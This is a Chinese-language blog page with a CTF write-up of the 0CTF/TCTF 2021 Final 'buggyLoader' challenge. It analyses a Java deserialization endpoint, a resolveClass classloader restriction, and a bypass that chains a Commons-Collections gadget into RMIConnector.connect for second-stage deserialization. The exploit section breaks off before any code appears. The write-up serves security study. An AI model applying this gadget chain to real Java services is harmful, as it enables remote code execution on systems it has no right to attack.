@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>buggyLoader | ccreaterのblog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="buggyLoader参考资料https:&#x2F;&#x2F;github.com&#x2F;c014&#x2F;0CTF-2021-Final-RevengePHP-and-buggyLoader-exp&#x2F;blob&#x2F;main&#x2F;buggyLoader&#x2F;Poc.java http:&#x2F;&#x2F;pipinstall.cn&#x2F;2021&#x2F;10&#x2F;01&#x2F;TCTF2021%E6%80%BB%E5%86%B3%E8%B5%9B2%E8%A7%A3Java%E">
+<meta property="og:type" content="article">
+<meta property="og:title" content="buggyLoader">
+<meta property="og:url" content="https://site.ccreater.top/2021/11/18/TCTF2021_BuggyLoader/index.html">
+<meta property="og:site_name" content="ccreaterのblog">
+<meta property="og:description" content="buggyLoader参考资料https:&#x2F;&#x2F;github.com&#x2F;c014&#x2F;0CTF-2021-Final-RevengePHP-and-buggyLoader-exp&#x2F;blob&#x2F;main&#x2F;buggyLoader&#x2F;Poc.java http:&#x2F;&#x2F;pipinstall.cn&#x2F;2021&#x2F;10&#x2F;01&#x2F;TCTF2021%E6%80%BB%E5%86%B3%E8%B5%9B2%E8%A7%A3Java%E">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-11-18T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-11-19T08:10:56.666Z">
+<meta property="article:author" content="ccreater">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="ccreaterのblog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">ccreaterのblog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://site.ccreater.top"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-TCTF2021_BuggyLoader" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/11/18/TCTF2021_BuggyLoader/" class="article-date">
+  <time class="dt-published" datetime="2021-11-18T16:00:00.000Z" itemprop="datePublished">2021-11-19</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      buggyLoader
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="buggyLoader"><a href="#buggyLoader" class="headerlink" title="buggyLoader"></a>buggyLoader</h1><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a target="_blank" rel="noopener" href="https://github.com/c014/0CTF-2021-Final-RevengePHP-and-buggyLoader-exp/blob/main/buggyLoader/Poc.java">https://github.com/c014/0CTF-2021-Final-RevengePHP-and-buggyLoader-exp/blob/main/buggyLoader/Poc.java</a></p>
+<p><a target="_blank" rel="noopener" href="http://pipinstall.cn/2021/10/01/TCTF2021%E6%80%BB%E5%86%B3%E8%B5%9B2%E8%A7%A3Java%E4%B8%8EBypass%20Shiro550%20ClassLoader.loadClass/">http://pipinstall.cn/2021/10/01/TCTF2021%E6%80%BB%E5%86%B3%E8%B5%9B2%E8%A7%A3Java%E4%B8%8EBypass%20Shiro550%20ClassLoader.loadClass/</a></p>
+<p><a target="_blank" rel="noopener" href="https://hpdoger.cn/2021/10/08/title:%20TCTF2021-final-writeup-1/#bugglyloader">https://hpdoger.cn/2021/10/08/title:%20TCTF2021-final-writeup-1/#bugglyloader</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7950">https://xz.aliyun.com/t/7950</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">urls = &#123;URL[35]@5409&#125; </span><br><span class="line"> 0 = &#123;URL@5410&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/classes!/&quot;</span><br><span class="line"> 1 = &#123;URL@5411&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/spring-boot-2.4.4.jar!/&quot;</span><br><span class="line"> 2 = &#123;URL@5412&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/spring-boot-autoconfigure-2.4.4.jar!/&quot;</span><br><span class="line"> 3 = &#123;URL@5413&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/logback-classic-1.2.3.jar!/&quot;</span><br><span class="line"> 4 = &#123;URL@5414&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/logback-core-1.2.3.jar!/&quot;</span><br><span class="line"> 5 = &#123;URL@5415&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/log4j-to-slf4j-2.13.3.jar!/&quot;</span><br><span class="line"> 6 = &#123;URL@5416&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/log4j-api-2.13.3.jar!/&quot;</span><br><span class="line"> 7 = &#123;URL@5417&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/jul-to-slf4j-1.7.30.jar!/&quot;</span><br><span class="line"> 8 = &#123;URL@5418&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/jakarta.annotation-api-1.3.5.jar!/&quot;</span><br><span class="line"> 9 = &#123;URL@5419&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/snakeyaml-1.27.jar!/&quot;</span><br><span class="line"> 10 = &#123;URL@5420&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/thymeleaf-spring5-3.0.12.RELEASE.jar!/&quot;</span><br><span class="line"> 11 = &#123;URL@5421&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/thymeleaf-3.0.12.RELEASE.jar!/&quot;</span><br><span class="line"> 12 = &#123;URL@5422&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/attoparser-2.0.5.RELEASE.jar!/&quot;</span><br><span class="line"> 13 = &#123;URL@5423&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/unbescape-1.1.6.RELEASE.jar!/&quot;</span><br><span class="line"> 14 = &#123;URL@5424&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/slf4j-api-1.7.30.jar!/&quot;</span><br><span class="line"> 15 = &#123;URL@5425&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/thymeleaf-extras-java8time-3.0.4.RELEASE.jar!/&quot;</span><br><span class="line"> 16 = &#123;URL@5426&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/jackson-databind-2.11.4.jar!/&quot;</span><br><span class="line"> 17 = &#123;URL@5427&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/jackson-annotations-2.11.4.jar!/&quot;</span><br><span class="line"> 18 = &#123;URL@5428&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/jackson-core-2.11.4.jar!/&quot;</span><br><span class="line"> 19 = &#123;URL@5429&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/jackson-datatype-jdk8-2.11.4.jar!/&quot;</span><br><span class="line"> 20 = &#123;URL@5430&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/jackson-datatype-jsr310-2.11.4.jar!/&quot;</span><br><span class="line"> 21 = &#123;URL@5431&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/jackson-module-parameter-names-2.11.4.jar!/&quot;</span><br><span class="line"> 22 = &#123;URL@5432&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/tomcat-embed-core-9.0.44.jar!/&quot;</span><br><span class="line"> 23 = &#123;URL@5433&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/jakarta.el-3.0.3.jar!/&quot;</span><br><span class="line"> 24 = &#123;URL@5434&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/tomcat-embed-websocket-9.0.44.jar!/&quot;</span><br><span class="line"> 25 = &#123;URL@5435&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/spring-web-5.3.5.jar!/&quot;</span><br><span class="line"> 26 = &#123;URL@5436&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/spring-beans-5.3.5.jar!/&quot;</span><br><span class="line"> 27 = &#123;URL@5437&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/spring-webmvc-5.3.5.jar!/&quot;</span><br><span class="line"> 28 = &#123;URL@5438&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/spring-aop-5.3.5.jar!/&quot;</span><br><span class="line"> 29 = &#123;URL@5439&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/spring-context-5.3.5.jar!/&quot;</span><br><span class="line"> 30 = &#123;URL@5440&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/spring-expression-5.3.5.jar!/&quot;</span><br><span class="line"> 31 = &#123;URL@5441&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/spring-core-5.3.5.jar!/&quot;</span><br><span class="line"> 32 = &#123;URL@5442&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/spring-jcl-5.3.5.jar!/&quot;</span><br><span class="line"> 33 = &#123;URL@5443&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/commons-collections-3.2.1.jar!/&quot;</span><br><span class="line"> 34 = &#123;URL@5444&#125; &quot;jar:file:/opt/app/buggyloader.jar!/BOOT-INF/lib/spring-boot-jarmode-layertools-2.4.4.jar!/&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>给了个Jar包，把源文件搞出来一下，配一下调试环境</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> </span>&#123;</span><br><span class="line">   <span class="meta">@RequestMapping(&#123;&quot;/buggy&quot;&#125;)</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">(<span class="meta">@RequestParam(name = &quot;data&quot;,required = true)</span> String data, Model model)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="keyword">byte</span>[] b = Utils.hexStringToBytes(data);</span><br><span class="line">      InputStream inputStream = <span class="keyword">new</span> ByteArrayInputStream(b);<span class="comment">//</span></span><br><span class="line">      ObjectInputStream objectInputStream = <span class="keyword">new</span> MyObjectInputStream(inputStream);<span class="comment">//ObjectInputStream干啥的,使用ObjectInputStream来读取一些元数据</span></span><br><span class="line">      objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>题目很简单就一个反序列化(删除了一些代码)</p>
+<p>MyObjectInputStream:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyObjectInputStream</span> <span class="keyword">extends</span> <span class="title">ObjectInputStream</span> </span>&#123;</span><br><span class="line">   <span class="keyword">private</span> ClassLoader classLoader;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">MyObjectInputStream</span><span class="params">(InputStream inputStream)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="keyword">super</span>(inputStream);</span><br><span class="line">      URL[] urls = ((URLClassLoader)Transformer.class.getClassLoader()).getURLs();</span><br><span class="line">      <span class="keyword">this</span>.classLoader = <span class="keyword">new</span> URLClassLoader(urls);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">protected</span> Class <span class="title">resolveClass</span><span class="params">(ObjectStreamClass desc)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">      System.out.println(desc.getName());</span><br><span class="line">      Class clazz = <span class="keyword">this</span>.classLoader.loadClass(desc.getName());</span><br><span class="line">      <span class="keyword">return</span> clazz;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这就是全部的代码了</p>
+<p>这题还是考之前的shiro反序列化利用过程中遇到Shiro重写了 resolveClass 的实现</p>
+<p>关于这个的分析文章可以参考</p>
+<p><a target="_blank" rel="noopener" href="https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html">https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html</a></p>
+<p><a target="_blank" rel="noopener" href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html">http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.zsxsoft.com/post/35">https://blog.zsxsoft.com/post/35</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7950">https://xz.aliyun.com/t/7950</a></p>
+<h2 id="sink-二次反序列化"><a href="#sink-二次反序列化" class="headerlink" title="sink:二次反序列化"></a>sink:二次反序列化</h2><p>调用栈:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">findRMIServerJRMP:2007, RMIConnector (javax.management.remote.rmi) //二次反序列化触发点</span><br><span class="line">findRMIServer:1924, RMIConnector (javax.management.remote.rmi)</span><br><span class="line">connect:287, RMIConnector (javax.management.remote.rmi)</span><br><span class="line">connect:249, RMIConnector (javax.management.remote.rmi)// 进入rmi</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">transform:126, InvokerTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:158, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">getValue:74, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hashCode:121, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hash:339, HashMap (java.util)</span><br><span class="line">put:612, HashMap (java.util)</span><br><span class="line">readObject:342, HashSet (java.util)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:1170, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:2178, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:2069, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1573, ObjectInputStream (java.io)</span><br><span class="line">readObject:431, ObjectInputStream (java.io)//反序列化起点</span><br></pre></td></tr></table></figure>
+
+<p>这一解给了一个新的sink点</p>
+<p>通过cc链来调javax.management.remote.rmi.RMIConnector.connect从而完成二次反序列化</p>
+<h3 id="二次反序列化的触发过程"><a href="#二次反序列化的触发过程" class="headerlink" title="二次反序列化的触发过程"></a>二次反序列化的触发过程</h3><p>触发点是javax.management.remote.rmi.RMIConnector.connect，他回去解析jmxServiceURL</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">connect</span><span class="params">(Map&lt;String,?&gt; environment)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">		...</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">			...</span><br><span class="line">            RMIServer stub = (rmiServer!=<span class="keyword">null</span>)?rmiServer:</span><br><span class="line">                findRMIServer(jmxServiceURL, usemap);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check for secure RMIServer stub if the corresponding</span></span><br><span class="line">            <span class="comment">// client-side environment property is set to &quot;true&quot;.</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            ...</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>进入findRMIServer，接着进入findRMIServerJRMP</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> RMIServer <span class="title">findRMIServer</span><span class="params">(JMXServiceURL directoryURL,</span></span></span><br><span class="line"><span class="params"><span class="function">        Map&lt;String, Object&gt; environment)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> NamingException, IOException </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">boolean</span> isIiop = RMIConnectorServer.isIiopURL(directoryURL,<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (isIiop) &#123;</span><br><span class="line">        <span class="comment">// Make sure java.naming.corba.orb is in the Map.</span></span><br><span class="line">        environment.put(EnvHelp.DEFAULT_ORB,resolveOrb(environment));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String path = directoryURL.getURLPath();</span><br><span class="line">    <span class="keyword">int</span> end = path.indexOf(<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (end &lt; <span class="number">0</span>) end = path.length();</span><br><span class="line">    <span class="keyword">if</span> (path.startsWith(<span class="string">&quot;/jndi/&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> findRMIServerJNDI(path.substring(<span class="number">6</span>,end), environment, isIiop);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (path.startsWith(<span class="string">&quot;/stub/&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> findRMIServerJRMP(path.substring(<span class="number">6</span>,end), environment, isIiop);<span class="comment">//进入findRMIServerJRMP</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (path.startsWith(<span class="string">&quot;/ior/&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!IIOPHelper.isAvailable())</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">&quot;iiop protocol not available&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> findRMIServerIIOP(path.substring(<span class="number">5</span>,end), environment, isIiop);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> String msg = <span class="string">&quot;URL path must begin with /jndi/ or /stub/ &quot;</span> +</span><br><span class="line">                <span class="string">&quot;or /ior/: &quot;</span> + path;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> MalformedURLException(msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在findRMIServerJRMP触发反序列化</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> RMIServer <span class="title">findRMIServerJRMP</span><span class="params">(String base64, Map&lt;String, ?&gt; env, <span class="keyword">boolean</span> isIiop)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// could forbid &quot;iiop:&quot; URL here -- but do we need to?</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">byte</span>[] serialized;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        serialized = base64ToByteArray(base64);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> MalformedURLException(<span class="string">&quot;Bad BASE64 encoding: &quot;</span> +</span><br><span class="line">                e.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> ByteArrayInputStream bin = <span class="keyword">new</span> ByteArrayInputStream(serialized);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> ClassLoader loader = EnvHelp.resolveClientClassLoader(env);</span><br><span class="line">    <span class="keyword">final</span> ObjectInputStream oin =</span><br><span class="line">            (loader == <span class="keyword">null</span>) ?</span><br><span class="line">                <span class="keyword">new</span> ObjectInputStream(bin) :</span><br><span class="line">                <span class="keyword">new</span> ObjectInputStreamWithLoader(bin, loader);</span><br><span class="line">    <span class="keyword">final</span> Object stub;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        stub = oin.readObject();<span class="comment">// look here</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> MalformedURLException(<span class="string">&quot;Class not found: &quot;</span> + e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (RMIServer)stub;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从而绕过限定URLClassLoader的尴尬限制</p>
+<h3 id="调用connect"><a href="#调用connect" class="headerlink" title="调用connect"></a>调用connect</h3><p>接着就是ccx的老链了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">transform:126, InvokerTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:158, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">getValue:74, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hashCode:121, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hash:339, HashMap (java.util)</span><br><span class="line">put:612, HashMap (java.util)</span><br><span class="line">readObject:342, HashSet (java.util)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:1170, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:2178, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:2069, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1573, ObjectInputStream (java.io)</span><br><span class="line">readObject:431, ObjectInputStream (java.io)</span><br></pre></td></tr></table></figure>
+
+<p>HashSet::readObject-&gt;HashMap::put-&gt;HashMap::hash-&gt;TiedMapEntry::hashCOde-&gt;TiedMapEntry::getValue-&gt;LazyMap::get-&gt;Transformer::transform</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span 